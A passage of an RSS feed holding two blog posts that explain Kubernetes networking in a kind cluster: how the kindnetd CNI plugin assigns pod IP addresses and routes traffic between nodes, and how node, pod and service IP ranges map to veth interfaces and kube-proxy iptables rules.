				<description>&lt;p&gt;In my &lt;a href=&quot;https://raesene.github.io/blog/2024/11/01/The-Many-IP-Addresses-Of-Kubernetes/&quot;&gt;last blog&lt;/a&gt; I took a look at some of the different IP addresses that get assigned in a standard Kubernetes cluster, but an obvious follow-on question is, how do pods get those IP addresses?, and to answer that question we need to talk about network plugins.&lt;/p&gt;

&lt;p&gt;The Kubernetes project took the decision to delegate this part of container networking to external software, in order to make it a more flexible system that can be adapted to different use cases. The way this is done is that the project leverages the &lt;a href=&quot;https://www.cncf.io/projects/container-network-interface-cni/&quot;&gt;CNI&lt;/a&gt; specification and plugins which comply with that spec. can be used to provide container networking in Kubernetes clusters.&lt;/p&gt;

&lt;p&gt;This means that, like many areas of Kubernetes, there’s quite a lot of possible complexity and options to consider, and over 20 different network plugins each with their own approach, so let’s start with the basics!&lt;/p&gt;

&lt;h2 id=&quot;exploring-a-basic-cluster-set-up&quot;&gt;Exploring a basic cluster set-up&lt;/h2&gt;

&lt;p&gt;We’ll make use of &lt;a href=&quot;https://kind.sigs.k8s.io/&quot;&gt;kind&lt;/a&gt; to provide an initial demonstration cluster, which will give us their default network plugin &lt;a href=&quot;https://github.com/kubernetes-sigs/kind/tree/main/images/kindnetd&quot;&gt;kindnetd&lt;/a&gt;. Kindnetd provide a simple CNI implementation which works well for standard kind clusters. In order to demonstrate how networking works, we’ll setup a couple of worker nodes using this config file&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Cluster&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;kind.x-k8s.io/v1alpha4&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;nodes&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;role&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;control-plane&lt;/span&gt;
&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;role&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;worker&lt;/span&gt;
&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;role&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;worker&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then, with that file saved as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kindnet-multi-node.yaml&lt;/code&gt; we can start our test cluster with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kind create cluster --name=kindnet-multi-node --config=kindnet-multi-node.yaml&lt;/code&gt;. Once the cluster’s up and running we can take a look at the networking.&lt;/p&gt;

&lt;p&gt;One of the first questions we might have is “how are Kubernetes network plugins configured?”. The answer is that any CNI plugins in use have a configuration file in a nominated directory, which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/cni/net.d&lt;/code&gt; by default. If we look at that directory on our kind nodes we’ll see a file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10-kindnet.conflist&lt;/code&gt; which contains the configuration for the network plugin. Looking at the files in this directory is actually the most reliable way to determine which network plugin(s) are in use as there’s no direct record of it at a Kubernetes level.&lt;/p&gt;

&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;cniVersion&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0.3.1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;kindnet&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;plugins&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ptp&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;ipMasq&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;ipam&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;host-local&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;dataDir&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/run/cni-ipam-state&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;routes&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                                &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;dst&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0.0.0.0/0&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;ranges&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                                &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;subnet&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;10.244.2.0/24&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;mtu&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1500&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;portmap&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;capabilities&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;portMappings&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From this configuration file we can see a bit of how the network plugin works. Firstly we see the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ptp&lt;/code&gt; plugin is used. This plugin is actually one of the default ones that the CNI project maintains. What it does is create a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;veth&lt;/code&gt; network interface for each container, which can then be given an IP address. We can also see an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipam&lt;/code&gt; section which deals with how containers are allocated IP addresses. In this case we can see that a range of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.244.2.0/24&lt;/code&gt; is assigned to this node, and if we look at the other worker node in the cluster we see it has the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.244.1.0/24&lt;/code&gt; range,and the control plane node has &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.244.0.0/24&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;So the next question might be “how does the traffic from a pod on one node get to a pod on another node?”. This will vary depending on the network plugin you’re using but in the case of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kindnet&lt;/code&gt; it’s pretty simple. Essentially each node has the entries for the other nodes in its routing table. We can see that by running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ip route&lt;/code&gt; on one of our nodes.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;default via 172.18.0.1 dev eth0 
10.244.0.0/24 via 172.18.0.3 dev eth0 
10.244.2.0/24 via 172.18.0.2 dev eth0 
172.18.0.0/16 dev eth0 proto kernel scope &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;src 172.18.0.4
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In this file we can see that the other nodes in the cluster have IP addresses of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;172.18.0.3&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;172.18.0.2&lt;/code&gt; respectively, and the container subnets are routed to those nodes.&lt;/p&gt;

&lt;p&gt;We can also see how traffic gets to individual pods on that node. First let’s create a deployment with 4 replicas &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl create deployment webserver --image=nginx --replicas=4&lt;/code&gt;. Once we’ve got that setup, we can run the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ip route&lt;/code&gt; command again to see what effect that has had.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;default via 172.18.0.1 dev eth0 
10.244.0.0/24 via 172.18.0.2 dev eth0 
10.244.1.2 dev vethc2e31815 scope host 
10.244.1.3 dev veth2621a4f6 scope host 
10.244.2.0/24 via 172.18.0.3 dev eth0 
172.18.0.0/16 dev eth0 proto kernel scope &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;src 172.18.0.4
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see two new entries in our routing table for the two containers that got started on this worker node, showing how traffic would be sent to the container once it reaches the node.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;This was a quick look at a very simple CNI implementation, and how it all works will vary depending on the network plugin(s) you use. If you’re looking for a more in-depth treatment of what we’ve discussed here, I’d recommend &lt;a href=&quot;https://www.tkng.io/&quot;&gt;The Kubernetes Networking Guide&lt;/a&gt; which has a lot of information on this topic and others.&lt;/p&gt;
</description>
				<pubDate>Thu, 07 Nov 2024 12:00:00 +0000</pubDate>
				<link>https://raesene.github.io/blog/2024/11/07/Exploring-a-basic-Kubernetes-Network-Plugin/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2024/11/07/Exploring-a-basic-Kubernetes-Network-Plugin/</guid>
			</item>
		
			<item>
				<title>The Many IP Addresses of Kubernetes</title>
				<description>&lt;p&gt;When getting to grips with Kubernetes one of the more complex concepts to understand is … all the IP addresses! Even looking at a simple cluster setup, you’ll get addresses in multiple different ranges. So this is a quick post to walk through where they’re coming from and what they’re used for.&lt;/p&gt;

&lt;p&gt;Typically you can see at least three distinct ranges of IP addresses in a Kubernetes cluster, although this can vary depending on the distribution and container networking solution in place. Firstly there is the node network where the container, virtual machines or physical servers running the Kubernetes components are, then there is an overlay network where pods are assigned IP addresses and lastly another network range where Kubernetes services are located.&lt;/p&gt;

&lt;p&gt;We’ll start with a standard &lt;a href=&quot;https://kind.sigs.k8s.io/&quot;&gt;kind&lt;/a&gt; cluster before talking about some other sources of IP address complexity. We’ll start by running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kind create cluster&lt;/code&gt; to get it up and running.&lt;/p&gt;

&lt;p&gt;Once we’ve got the cluster started we can see what IP address the node has by running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker exec -it kind-control-plane ip addr show dev eth0&lt;/code&gt; . The output of that command should look something like this&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;13: eth0@if14: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc noqueue state UP group default 
    &lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt;/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fc00:f853:ccd:e793::2/64 scope global nodad 
       valid_lft forever preferred_lft forever
    inet6 fe80::42:acff:fe12:2/64 scope &lt;span class=&quot;nb&quot;&gt;link 
       &lt;/span&gt;valid_lft forever preferred_lft forever
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see that the address assigned is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;172.18.0.2/16&lt;/code&gt;, which is a network controlled by Docker (as we’re running our cluster on top of Docker). If you have a Virtual machine or physical server the IP addresses will be in whatever range is assigned to the network(s) the host has.&lt;/p&gt;

&lt;p&gt;So far, so simple. Now lets add a workload to our cluster and see what addresses are assigned there. Let’s start a webserver workload with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl run webserver --image=nginx&lt;/code&gt;. Once that pod starts we can run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl get pods webserver -o wide&lt;/code&gt; to see what IP address has been assigned to the pod.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;NAME        READY   STATUS    RESTARTS   AGE   IP           NODE                 NOMINATED NODE   READINESS GATES
webserver   1/1     Running   0          42s   10.244.0.5   kind-control-plane   &amp;lt;none&amp;gt;           &amp;lt;none&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Our pod has an IP address of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.244.0.5&lt;/code&gt; which is in an entirely different subnet! This IP address is part of the overlay network that most (but not all) Kubernetes distributions use for their workloads. This subnet is generally automatically assigned by the Kubernetes &lt;a href=&quot;https://kubernetes.io/docs/concepts/extend-kubernetes/compute-storage-net/network-plugins/&quot;&gt;network plugin&lt;/a&gt; used in the cluster, so it’ll change based on the plugin in use and any specific configuration for that plugin. What’s happening here is that our Kubernetes node has created an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;veth&lt;/code&gt; interface for our pod and assigned that address to it. We can see the pod IP addresses from the hosts perspective by running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker exec kind-control-plane ip route&lt;/code&gt; and we can see the IP addresses assigned to the different pods in the cluster, including the IP address we saw from our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get pods&lt;/code&gt; command above.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;default via 172.18.0.1 dev eth0 
10.244.0.2 dev veth9ee91973 scope host 
10.244.0.3 dev veth1b82cd96 scope host 
10.244.0.4 dev veth38302a10 scope host 
10.244.0.5 dev vethf915cecb scope host 
172.18.0.0/16 dev eth0 proto kernel scope link src 172.18.0.2 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we’ve got the node network and the pod network, let’s see what happens if we add a Kubernetes &lt;a href=&quot;https://kubernetes.io/docs/concepts/services-networking/service/&quot;&gt;service&lt;/a&gt; to the mix. We can do this by running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl expose pod webserver --port 8080&lt;/code&gt; which will create a service object for our webserver pod. There are several types of service object, but by default a ClusterIP service will be created, which provides an IP address which is visible inside the cluster, but not outside it. Once our service is created we can look at the IP address by running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl get services webserver&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;NAME        TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)    AGE
webserver   ClusterIP   10.96.198.83   &amp;lt;none&amp;gt;        8080/TCP   97s
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see from the output that the IP address is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.96.198.83&lt;/code&gt; another IP address range! This range is set by a command line flag on the Kubernetes API server. In the case of our kind cluster, it looks like this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--service-cluster-ip-range=10.96.0.0/16&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;But from a host perspective, where does this IP address fit in. Well the reality of Kubernetes service objects is that, by default, they’re iptables rules created by the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kube-proxy&lt;/code&gt; service on the node. We can see our webserver service by running this command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker exec kind-control-plane iptables -t nat -L KUBE-SERVICES -v -n --line-numbers&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Chain KUBE-SERVICES (2 references)
num   pkts bytes target     prot opt in     out     source               destination         
1        1    60 KUBE-SVC-NPX46M4PTMTKRN6Y  6    --  *      *       0.0.0.0/0            10.96.0.1            /* default/kubernetes:https cluster IP */ tcp dpt:443
2        0     0 KUBE-SVC-UMJOY2TYQGVV2BKY  6    --  *      *       0.0.0.0/0            10.96.198.83         /* default/webserver cluster IP */ tcp dpt:8080
3        0     0 KUBE-SVC-TCOU7JCQXEZGVUNU  17   --  *      *       0.0.0.0/0            10.96.0.10           /* kube-system/kube-dns:dns cluster IP */ udp dpt:53
4        0     0 KUBE-SVC-ERIFXISQEP7F7OF4  6    --  *      *       0.0.0.0/0            10.96.0.10           /* kube-system/kube-dns:dns-tcp cluster IP */ tcp dpt:53
5        0     0 KUBE-SVC-JD5MR3NA4I4DYORP  6    --  *      *       0.0.0.0/0            10.96.0.10           /* kube-system/kube-dns:metrics cluster IP */ tcp dpt:9153
6     7757  465K KUBE-NODEPORTS  0    --  *      *       0.0.0.0/0            0.0.0.0/0            /* kubernetes service nodeports; NOTE: this must be the last rule in this chain */ ADDRTYPE match dst-type LOCAL
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;The goal of this post was just to explore a couple of concepts. Firstly, the variety of IP addresses you’re likely to see in a Kubernetes cluster and then how those tie to the operating system level.&lt;/p&gt;

</description>
				<pubDate>Fri, 01 Nov 2024 08:00:00 +0000</pubDate>
				<link>https://raesene.github.io/blog/2024/11/01/The-Many-IP-Addresses-Of-Kubernetes/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2024/11/01/The-Many-IP-Addresses-Of-Kubernetes/</guid>
			</item>
		
	</channel>
</rss>
